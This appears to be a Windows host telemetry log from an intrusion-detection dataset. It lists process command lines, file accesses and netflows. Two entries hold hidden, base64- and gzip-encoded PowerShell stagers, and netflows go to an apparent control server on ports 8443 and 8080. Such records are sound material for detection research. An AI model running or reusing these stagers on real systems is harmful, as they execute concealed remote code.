17301928827cf268975cac641c965557461e70b4d7a9ccb186f66d727b3d2324,{'subject': 'c:/windows/system32/windowspowershell/v1.0/powershell.exe C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEATQBVAEwAMQAyAEkAQwBBADcAVgBYAGIAWQAvAGEAUgAnACcAKwAnACcAaABEACcAJwArACcAJwArAFgAcQBuAC8AdwBZAHEAUQBNAEEAbwBIAE4AcgBpAFgAdQAwAGkAUgBhAHMAUAB4AEYAbQB4AGUALwBIAFoAQQBVAFcAWABzAHQAYgAzAEgAMgBrAHYAcwBOAFIAeABwACsAOQA4ADcAQwAvAGoAdQBvAGwAegBhAHQARgBJAHMAVwBhAHgAMwBaADIAWgBuAG4AMwBsAG0AWgB7ADEAfQBtAEwAMQBHAGUAWQBwAHsAMQB9AEkAZQBDAEgALwA4AC8ASgBOAHcAZQBhAFoAZQA1AGkAVwBDAFcAUABHAEwAcwBGADAAWABLAHIAdABzAHUAcAAzAFcAbgBwAGMAcgBPADYAcAAxAGgAQQArAEMAdQBGAEoAMwB1AHkANQBOAFAASgB5AHUAMwA3AC8AdgBGAEYAbQBHAFUAbgBiACsAYgB2AFEAUgBVAC8ATQBjAEoAUgB1AEMAVQBTADcAVwBoAEQAOABGAE4AMABZAFoAdQBwAHAAcwBIAHAARABQAGgARAArAEUAeQB1ACsATgBQAHEARQBiAGoAMQB6AEUAagBoADMAUABqADUARgB3AHAAYQBZAEIAWAB4AHQAVAAzACsATwBlAE4AYwB3AGQAdwBVAHkAcwAvAHYAWgBiAHQAYgBhADYAawB0AGUATgB1ADAAKwBGAFIAMwBLAHgAYQBoACcAJwArACcAJwA1AHoAaABwAEoARwBRAEUAaQAxAEoAdgB4AFYANAB4AHQAYQB4AHgAMABTAHEAegByADIATQA1AHIAVABrAEQAVgBjAG4ATABaACcAJwArACcAJwBiAEQAVAB2AE4AdgBSAEEAWgBZAEcAMgBQAGQATQBSAGkARwB1AFIAVgBPAE0AegB6AGMAVABMAEUAaQBpAHcAOQBuADQAcQBiAE8AUQB1AEoAVgBSAGgATwBNACsAcQByAFEAWgBDAGgAUABLAC8AVwBoAFIAWABmAFkATABWAGUALwB5AHEAdQBMAHIAdgBQAGkANQBUAGgAQgBEAFcARwBLAFUATQBaADMAWgBrAG8AMgAyAE0AZgA1AFkAMgBCAGwAdwBZAEUAegBWAEcANABCAGkAMgBUAFoAVABpAE4AMQByAFUAYQBpAE8AMwBwAEYAbwBtAFYAdABDAEMAawBMAHYAdwBYAE0ANgBLAEIARABpAFYAMgAzADYAcwBrAHYAbABRAEMAcQBTAG4ATABhAG4AVwBJADYAaQB2AG4AMQBHAGwAUQBFAEgAVABXAHIATAA3AGkANgBJAGsASgBOAFgAaQBlADIAQQBBAEkALwBzAFYAQgBEAEUAcwBHAEgAWgBlAHQAVgB5AGoAMABQAEYARQArAHEAOQBNAEsAQQBwAC8ARgBLAGMAMwB4AFMAZgBlAEQASQBOAFUARgBIAFgAYgAzAEcATQAyAE8AOABGAG0AeABzAHsAMQB9AEwAVgAxAGsAKwBJAEMANQBWAEEAQwB0AFAANgA5ADEAcQBUAFMAMQBXAHUAVwBBAFEAdwBzADMASQBvAEQAdABiAFAAKwBsADgAUQBvAEIASgB3AHAAWAA4AHsAMQB9AGMAeABlAEYATwBFAFgAZABZACsAbwBsADIAQwAvADUASwByADQAVwBFAHgAUQBTAGQATQBLAGoAVQBZAG8AWgA0AEoANQBZAHYAUwB5AHsAMQB9AG8ASQBzAEkAaQBqAHoARwBVAGUAYgBVACsARQByAHQATABzAEgAcwBTAFYAYwByAE0AQQBsAFEAcAB2AG8AUQAxAHgAeQA4AHsAMQB9AHAARABYAHYAbgBUAG0ASABEAGkAeAAnACcAKwAnACcATwBrAHgAMQBsAEEAJwAnACsAJwAnAEIAMgA1ADIALwB7ADEAfQBhAGkAVwBFAEwARQBHAGwAOQBDAFUAegBqAHUAWAB1AC8AQgB1AEUAcQBoADMAaQA1AFgAbABkAG0AQgBhAFEAcABuADUAZABNAEoARgBIAFUARgBBAFgAMQBEAFQASABsAHkAVwAxAFkAUABRADAAcgBEADYANwBxAHgAZQBFAFkAZAAvAEwAVwBXAGwAdQBYAGYAcwBDAHoATQB1AG0ASABaAHIAbQBMAEMAdAA4AGkAQwBrAEEAWQBKAGsANwA1AEcATwBQAGMARAB6AHEAdwB7ADEAfQBBAEgAUwBEAHUAYQBPAEMAbwAzAHIANwA2AEsAUgBzAGMAagBCAEgASQBIAEwATwAwAGgARwBqAEQARABVAFQAQQBaAFoAMABvAEcAZgBwADUAWQBVAFcAdQBZAGkAQQAyAFQASABVAEUASgB5AEoAeQBLAFIAbwA5ADQARQBaAFMASQBTADQAYQBjAHEATwBWAEYASwBLAGkAKwA2AG0AYQBaAEIAbQBmAE8AYwAxAFIASwBPAEYANAA0AEMAYQBFADIAQwAnACcAKwAnACcAVwBWADEAdwBjAEUAWgB7ADEAfQB3AEwARQBFAFEAWgBtAC8AUwA4AFgAdgBxADQAOAA0AEUAcwBuAFEANQBlADQAaQBHAFYAcQByAGIAUQBqADQAKwBTAHYASABNAEwAZgBIAHoAaABCAEwALwBpAGMAMABNAHsAMQB9AFkASQBOAEgATABhAEsASgA1AE8AYgBwAFcAegBqAFYARwBmAE4ATwBjADQASwBrAEsAegAyAEsAWQBFAGoAJwAnACsAJwAnADAAWQBiAGIARQA4AFAATQBDAHIAdwAyAHQAMwAzAHcAVQBmAFIANQBRAGQAUAAzAFkASABUAGQAMwB2ADUATgBOACsANwAwAGIARgBoACsAagB7ADEAfQAzAHgAaQBxAEgANAB3AEMAZABHACcAJwArACcAJwB1AEMAMwAnACcAKwAnACcATQB4AFIAVwBHAGUAcQBEAG0AWgBZADAAcABUAFkAMQB5AFEATAB4AHYAYQBRAEwAWQBiAHEAdwBNAEoAUwB0AEkAaAA5AEkAawAzAEIAaAByAG4ASQBKAFgAdwBZAHUATAByAGYAMQBUADQAZgBXAGoAbgBRAFYARgBFAEcAOQA1AEwAYQBiAGkAdQBUAHQAcgBRAEYAOABCAFoAWQBqAHIAWgBxAFkAQwBUADQAOABEAGkARwBNAFIAVABUAHkAVgB7ADEAfQBiADUAcABvADAASgBIAGUAagB6AG4AegBqAHQAJwAnACsAJwAnAG4AcABMAGwAdwB5AGEAUwBpADgATwBYAFoAcQBiADEANAB0AHUAcwA5AG0AOABEAGIAegArAEwAeQBSAFEATgBSAHEAMABTAE8ARQA1AGMAMgBvAE4ALwBFAFIAcgBOAGgAMAA5AFkASgBZACcAJwArACcAJwB0AEcANQBiADkATgB2ADcATQAnACcAKwAnACcAegAyAG0ANQB0ADkAZQBlACsANQB7ADEAfQB2AHoAQgB0ADUALwBLAEIARwBIADMAdgBCAGIAcABQAE0AOQAwAEYAYgBqAHkAdwB5AGkAMwBSAEwATABmAFIAdQBIAGoAbAB7ADEAfQB4ADMAaQBZAHYAUgBzAE8AbwBwAGIAUgAyAFUAYQB6AGUAKwAyAHcANgBUAHYAMwBTADMAYwAwADkAdQA1AG4AZQA4AFAAUwAyACsATQBIAHYAVABYAHMAeABHAE8AegBOAHoAZQBzAHoAaQBIAGEAOQBFAG0AMgBOAEwAWABCADAAagBXAHkAegBSAEYAMABXAHYARgB4ADAANQBMAEoAKwBQAE4AJwAnACsAJwAnAFcAewAxAH0AYgAwAEsAbwArAHYATABrADQANgBpADYASwBaAG0ATABkAHgAbAA3AEMAZgBiAEoAegB0AHEAUAA3AHAAMgAwAGkAUgB0ADMAagBxAFcAMwBhAEoAZAA4AEoAbQArAFAAWQBMAEQARQAzAHoARAAvAFIANgAzAFkAMgBPADUAbABSAFMAegBxADgAbQBMADEAbwAyADgAYQBNADkAegAvAGMARwBZAGIAZQB6AGwAWQB0AEUATwBaAHIANABwAE8ANQBQAGUAYQBMAHUAeABSAHAAYgA5ADAAQgB0AGIALwBlAFgARQAnACcAKwAnACcAZABPAFAASABoAGUAdQByAGQAagArACsAeAA4AHQAbQB2ADMAbgByAGoAaAA2AEoAUQBkAFgAdQBtAE0AWQA5AHcARQBRAE8ATABDAGQANQB5AEIAeABUAGUAUQBkAHIAcgBoAGYAdABRAG0AKwBvAEEAawA2AGQAawBkAEsAbgBkADMAYQBmAGgAawA0AFMAeQAvAFAAZABkAGYALwBrAEYAKwBEAG8ASgBCAEgAVAA0AHAAagBMADkAdwA0AEQAMgAvAGEARwBrAGEAVQBDADcAdgBPAHAASwBpAHYAVABwAG0ATwAxADcANAAzAHIATwB4ADgAOAAxAGoANwBOACsAcABGADYAQgB5AE0AUAAzAHAAbQBxAFcAVgA0AFAAYgArADIAMwA5ADAAMQA1AEMAWABzAHIAYQBlAHEAMABJAG4AVQBJAGEANwBhADgAcABIAGMANwBiADYAVABzACcAJwArACcAJwBtAHcANwBuAHoAMgBjAGwASAA2AGoAKwBCAE8AegBmAEUAMQBjADMAdwB1AHYAKwBuAHMAZAA0ADcANgBmAHoAWQA5AEMALwBLAHoAYQBKAEkANgBuAGoALwBZAEYANQBJAC8AQgBaAHMANQBxADMAOQBvAGMAMwBrAEEAUQByAEcANgBlAHMAMwBWAHAAWAA5AHEATgBQADIAJwAnACsAJwAnAFkAdwAzAGkAWgA5AC8AcQBoAEQALwBSAFMAWgA4AHEAdwBYAHEAWABwAGIAJwAnACsAJwAnAEgASABvAEUATQB7ADEAfQBkADUAVwBGAHEAawBlACcAJwArACcAJwB6AFgAcQBYAFoAagBXAGwAbQBHAHUASQBJAGwAeAA3AHQAaQBoAEwARQBZAEYANwBBACcAJwArACcAJwB0AHcAawB5AHUAeABXAEMAYQBFACsANwA1AFcAOABxAFUARwBiAFAAagBkAFAAMwBzAHYAdAA0AGMAbQBsADEAMABZADEANABVAG0AdwA5AHQAeABDAHkANgBuADMANwA1AGYAewAxAH0ASQB0AFEATABuAHMAeQBOAE0AJwAnACsAJwAnAFUAbwBqAEYAdABlAGwAeAA3AFkAawBRAGUAdQBUAEgAaQBYAGwAVgBCAGkAKwAvADIAQQBkAHUAagB1AEsASgAyAE4AMQAzAGoAdwBCAGwAOQBJADIATwBkAGsARwBjAHoAewAxAH0AVQBSAFAARgBIAFEAdwBVADMASgBBAGIARgArAHAAdAB7ADEAfQBmAFEAcwAzADIASAB7ADEAfQBMAHgAUgBWAHEALwBiAG4AbQBjAGYAUQAnACcAKwAnACcAMABTAHMAbABMADcARQA2AEgAZQBtAEwAQgBTACsAQQBBAE0AUgBsAE8AdgBlAEoAWABvAHoATQA5AHcATQBBAFYAKwBpAFIAVQBHAEwAOAA0AHYATAB5AEkAVgBJADUAcQA5AGkATQBwAGMAeQBuAGMATQBmAHcARQAvADAASwBaADUANwBsAC8AVwBQADAAdQBHAGsAbAAxAGoAcwAxAFgAawAxADkATwB2AE8AaAAyAFAAKwB6ADAAcgBvAGMAWgB5AEoAbgBRAGYAQQB7ADEAfQA2ADMANABWAGUAQgBlAEcAUwBJAGkAOQBpAEMAMgBFAEIALwBvAGUAWABoAC8AOQBCAG0AQgBUAHMAeQBvAEEATAA1ADYAbgA5AC8AUQAyAGgAZgAxAGYAeQBtAHsAMQB9AHcAQQBBAEEAewAwAH0AewAwAH0AJwAnACkALQBmACcAJwA9ACcAJwAsACcAJwBnACcAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA'},470881
0b1f52205ced70b9fd84ef3ce24cbabcee37416aed61dddcdbc2f7fe81d930a1,{'file': 'c:/windows/system32/svchost.exe'},189794
11c68c80ab66e43acedd1f1583abfd105b1ea10d1a0c9ef43c301f668ab9bb74,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 14712960872013529032212180383310137508421618420066-249767920-2123542115-106330918'},470883
d31750b200247f2a170bf0b8a07b1300d42c2c2009e69816b5571e4e203c6757,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k LocalServiceNoNetwork'},469860
017732516056685991472df328a2dff306787651d020db28eaca4623c4ecc760,{'subject': 'c:/windows/explorer.exe C:/Windows/Explorer.EXE'},469861
bc28b78f3af66755cfa7d129efa52ba56d780c43492f38816a3d982b421ec9a3,{'file': 'c:/program files/wireshark/dumpcap.exe'},1895
619a24b16a82e5b909bed145bdd2b59b0f922203581e2aa599a4afa83d04bb2a,"{'subject': 'c:/windows/system32/windowspowershell/v1.0/powershell.exe powershell.exe -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((H4sIAMUL12ICA7VXbY/aR+hD++Xqn/wYqQMAoHNriXu0iRasPxFmxe/HZAUWXstb3H2kvsNRxp+987C/juolzatFIsWax3Z2Znn3lmZ{1}mL1GeYp{1}IeCH/8/JNweaZe5iWCWPGLsF0XKrtsup3WnpcrO6p1hA+CuFJ3uy5NPJyu37/vFFmGUnb+bvQRU/McJRuCUS7WhD8FN0YZuppsHpDPhD+Eyu+NPqEbj1zEjh3Pj5FwpaYBXxtT3+OeNcwdwUys/vZbtba6kteNu0+FR3Kxah+5zhpJGQEi1JvxV4xtaxx0Sqzr2M5rTkDVcnLZ+bDTvNvRAZYG2PdMRiGuRVOMzzcTLEiiw9n4qbOQuJVRhOM+qrQZChPK/WhRXfYLVe/yquLrvPi5ThBDWGKUMZ3Zko22Mf5Y2BlwYEzVG4Bi2TZTiN1rUaiO3pFomVtCCkLvwXM6KBDiV236skvlQCqSnLanWI6ivn1GlQEHTWrL7i6IkJNXie2AAI/sVBDEsGHZetVyj0PFE+q9MKAp/FKc3xSfeDINUFHXb3GM2O8Fmxs{1}LV1k+IC5VACtP691qTS1WuWAQws3IoDtbP+l8QoBJwpX8{1}cxeFOEXdY+ol2C/5Kr4WExQSdMKjUYoZ4J5YvSy{1}oIsIijzGUebU+ErtLsHsSVcrMAlQpvoQ1xy8{1}pDXvnTmHDix+Okx1lA+B252/{1}aiWELEGl9CUzjuXu/BuEqh3i5XldmBaQpn5dMJFHUFAX1DTHlyW1YPQ0rD67qxeEYd/LWWluXfsCzMumHZrmLCt8iCkAYJk75GOPcDzqw{1}AHSDuaOCo3r76KRscjBHIHLO0hGjDDUTAZZ0oGfp5YUWuYiA2THUEJyJyKRo94EZSIS4acqOVFKKi+6maZBmfOc1RKOF44CaE2C+WV1wcEZ{1}wLEEQZm/S8Xvq484EsnQ5e4iGVqrbQj4+SvHMLfHzhBL/ic0M{1}YINHLaKJ5ObpWzjVGfNOc4KkKz2KYEj+0YbbE8PMCrw2t33wUfR5QdP3YHTd3v5NN+70bFh+j{1}3xiqH4wCdG+uC3+MxRWGeqDmZY0pTY1yQLxvaQLYbqwMJStIh9Ik3BhrnIJXwYuLrf1T4fWjnQVFEG95LabiuTtrQF8BZYjrZqYCT48DiGMRTTyV{1}b5po0JHejznzjt+npLlwyaSi8OXZqb14tus9m8Dbz+LyRQNRq0SOE5c2oN/ERrNh09YJY+tG5b9Nv7M+z2m5t9ee+5{1}vzBt5/KBGH3vBbpPM90Fbjywyi3RLLfRuHjl{1}x3iYvRsOopbR2Uaze+2w6Tv3S3c09u5ne8PS2+MHvTXsxGOzNzesziHa9Em2NLXB0jWyzRF0WvFx05LJ+PN+W{1}b0Ko+vLk46i6KZmLdxl7CfbJztqP7p20iRt3jqW3aJd8Jm+PYLDE3zD/R63Y2O5lRSzq8mL1o28aM9z/cGYbezlYtEOZr4pO5PeaLuxRpb90Btb/eXE+dOPHheurdj++x8tmv3nrjh6JQdXumMY9wEQOLCd5yBxTeQdrrhftQm+oAk6dkdKnd3afhk4Sy/Pddf/kF+DoJBHT4pjL9w4D2/aGkaUC7vOpKivTpmO1743rOx881j7N+pF6ByMP3pmqWV4Pb+239015CXsraeq0InUIa7a8pHc7b6Ts+mw7nz2clH6j+BOzfE1c3wuv+nsd476fzY9C/KzaJI6nj/YF5I/BZs5q39oc3kAQrG6es3VpX9qNP2+Yw3iZ9/qhD/RSZ8qwXqXpb+HHoEM{1}d5WFqke+zXqXZjWlmGuIIlx7tihLEYF7A+twkyuxWCaE+75W8qUGbPjdP3svt4cml10Y14Umw9txCy6n375f{1}ItQLnsyNM+UojFtelx7YkQeuTHiXlVBi+/2AdujuKJ2N13jwBl9I2OdkGcz{1}URPFHQwU3JAbF+pt{1}fQs32H{1}LxRVq/bnmcfQ+0SslL7E6HemLBS+AAMRlOveJXozM9wMAV+iRUGL84vLyIVI5q9iMpcyncMfwE/0KZ57l/WP0uGkl1js1Xk19OvOh2P+z0rocZyJnQfA{1}634VeBeGSIi9iC2EB/oeXh/9BmBTsyoAL56n9/Q2hf1fym{1}wAAA{0}{0})-f=,g)))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'}",470888
8bb342e7a1cda2c4065ce7f27e1812b362bb3d686df5fa106acc72f24889fe5f,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 1666846486-779156655-774406944-3116519025536314-10197683971052088329-277897143'},470889
493449387981f542ae99e39f97088186bf62efe820e30bde2fafe79360875fb4,{'file': 'c:/program files/wireshark/tshark.exe'},1919
0395a7c6e956e481154cfba51b07c801fdb74c38b261b4ef32e622e269a870b9,{'subject': 'c:/windows/system32/audiodg.exe C:/Windows/system32/AUDIODG.EXE 0xc18'},472459
a3bc39197a1a026e21367da78b9d2635ca5cc5511d7b6c768acd4fa10ffa827f,{'subject': 'c:/windows/system32/audiodg.exe C:/Windows/system32/AUDIODG.EXE 0xc18'},472467
36701d8bef3cb5ae5eb35a855e471a939d3bcf75d976e4f7297943ed4aaaebac,{'file': 'c:/windows/system32/mshta.exe'},447383
2fbde5f768353c52a330ff1e27be0c37d02ce85aba0b4fa91f303660fea5fa05,{'netflow': '192.168.223.128:50149->10.193.66.115:8443'},473507
8842911f3bdd65f9fff79175f4e2fdf7f1d01a655bfc9d4ec9b0ddf38b512b46,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k netsvcs'},469923
4cf264d488f7cf35e7454bdca2e19772c578eaf05973bbf04f9e3fd3c3d1343a,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{F9717507-6651-4EDB-BFF7-AE615179BCCF}'},473508
b37ac080e71c1fe650bc5220683d89f0637a86753c991f78dbfaf6605d546a7b,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k WerSvcGroup'},469928
a298ea4ac54414cae303113c0a14a71272b5af0067f236f5e7ffefbfec56a076,{'subject': 'c:/program files/confer/repux.exe repux.exe'},473513
f3a362dbe12bad0d306f1ddec8f3b8bf8a893871097c2e7109dbe097606d5b01,{'subject': 'c:/program files/mozilla firefox/firefox.exe C:/Program Files/Mozilla Firefox/firefox.exe -contentproc --channel=3900.5.951001077/391959572 -greomni C:/Program Files/Mozilla Firefox/omni.ja -appomni C:/Program Files/Mozilla Firefox/browser/omni.ja -appdir C:/Program Files/Mozilla Firefox/browser  3900 /./pipe/gecko-crash-server-pipe.3900 tab'},470953
179f92addc05d8b6f81fdec2cb54ad8ce3b97f14eb48e9f55436983f2850b11b,{'subject': 'c:/windows/system32/services.exe C:/Windows/system32/services.exe'},469929
277838b2bdf3d23c98629fc02b41fb3a0c2b7e5de45281760c0c4f658bc12757,{'subject': 'c:/python27/python.exe python  -m SimpleHTTPServer'},470957
08cabf6b077594bf4baf9766a49d2dafcb4e3f7e879af0486706655afbba6144,{'subject': 'c:/windows/system32/cmd.exe C:/Windows/System32/cmd.exe '},470958
dc5e419f596198cacd0140f50cf7377044dbd035756b25caebacf1c12023f5af,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -1647456713-875421518142973041025147409-1538463883-17554966281843809978-395611313'},470959
f04319755dcf8d05e33d2d6c7a7412848abad97b76839635fc6218cfeda4b453,{'subject': 'c:/program files/wireshark/dumpcap.exe C:/Program Files/Wireshark/dumpcap.exe -n -i /Device/NPF_{DE145F66-537B-427D-820A-707CC694DA57} -f udp port 53 -Z 4660'},470960
59d721f381c754ef3e28774539d4a6905347da47c0c5b329c6c1000be8f7b5fd,{'subject': 'c:/program files/wireshark/tshark.exe C:/Program Files/Wireshark/tshark  -i 2 -t ad -f udp port 53 '},470961
0817ec915f3aeec7f89f81c56323cbcc1883fa3a1241dc6f59f568b654e27e7d,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 177932576498535421-2113097610153166625491838115-2083859539-6155808142143712326'},470962
6b62666f2d6effe1052b7deebc68e7d2506c7925d05daff1869f2537be16114f,{'subject': 'c:/windows/system32/cmd.exe C:/Windows/system32/cmd.exe /c C:/Users/aalsahee/Desktop/start_dns_logs.bat '},470964
7368fc9d1e74a6d4ed4add864ae5f16a0c084355eb2c4f8b6d65c82bd9e3d458,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -1107079934-510235374-1756141904188279807918412658731467348259839592866666406460'},470965
2f1e302555d8c8a565bf17d70c838005dd350c17ac5dc0fab3842db97461ec13,{'file': 'c:/windows/system32/windowspowershell/v1.0/powershell.exe'},318390
616df077b14e3e4929c04d5f2d05f96fb271d1d6c56d2d3f0913b40a8356ac47,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k swprv'},471481
a8b1ccb871e8dddc3c78ca523e88c5ec92fc4d30e8a76ad5a2237bb747824445,{'file': 'c:/windows/system32/dwm.exe'},124863
4dec786758a4b0107204ef665e9bfcc3f8b1f0acf359b023be9bd174e3ef10e6,{'subject': 'c:/program files/microsoft office/office14/winword.exe C:/Program Files/Microsoft Office/Office14/WINWORD.EXE '},469960
e94411b0ab40904d08aa339e28c0bec184e27acb0f0230ac9f30702e93a1f15c,{'netflow': '192.168.223.128:50103->10.193.66.115:8080'},469961
4ea09ba7a09d60c3d8144379dd21afe651b32651b7a11168089684cec61a168d,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k DcomLaunch'},469962
9f8ac36806665317fa251bf38d3575497d18f7958c6f03cbcf034bfd86eaa556,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{F9717507-6651-4EDB-BFF7-AE615179BCCF}'},469963
382617861ca4f65a7702b0e8db922337b59d9fffe862d76f535f5d2c48c9f824,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k RPCSS'},469964
841a0ed17d9fc1f6e3fcd11487232d0b6a38052635a09019aea31f2e7a004f40,{'subject': 'c:/program files/vmware/vmware tools/vmtoolsd.exe C:/Program Files/VMware/VMware Tools/vmtoolsd.exe -n vmusr'},473550
471292749f1e931e48bdae5af6a984d138e3bca180b2cc45b1b2159887b04426,{'subject': 'c:/program files/vmware/vmware tools/tpautoconnect.exe TPAutoConnect.exe -q -i vmware -a COM1 -F 30'},473551
7dad7e7d8f2e3e02caac619a5d94e57e11b5c26c624e6c6a598275edc15cea46,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -487645183-1293012984-1168617979-603719737-65541824142213917725269363891621020'},473552
c7c2d16d53d1e2c9a2c573bd98c9e7f3a0f91de7185be49c656df36d1ef69d26,{'subject': 'c:/program files/confer/repux.exe repux.exe'},473553
c35c9aa325e69d48c791dd463a85b484a99c25fa76bb07e68e910f19e2be4269,{'subject': 'c:/program files/microsoft office/office14/winword.exe C:/Program Files/Microsoft Office/Office14/WINWORD.EXE  /Embedding'},469969
3eedc8b87a0e381ef569bc6a88dc95e6a17aab9d5fcf04ce04fc834210649a90,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},471000
d82912b91bd2d7854eeece6c3f6967c1e58f3af78f6ddfb8c63de0705e8d0e80,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},471001
5aeb243c682f8bd6cc4184aa2f0d5f455849748eb1b6c7c20227f926a1d729df,{'subject': 'c:/windows/system32/audiodg.exe C:/Windows/system32/AUDIODG.EXE 0x76c'},471004
8ab27c7399a39e639331aaba11dec411db9d51fc377260454bbe8a908e4b0706,{'subject': 'c:/windows/system32/audiodg.exe C:/Windows/system32/AUDIODG.EXE 0x76c'},471005
d36d5388ed0e870dde4f9de0ddeda2aff2fa9ba9af19383556a421629e7abcbc,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},471007
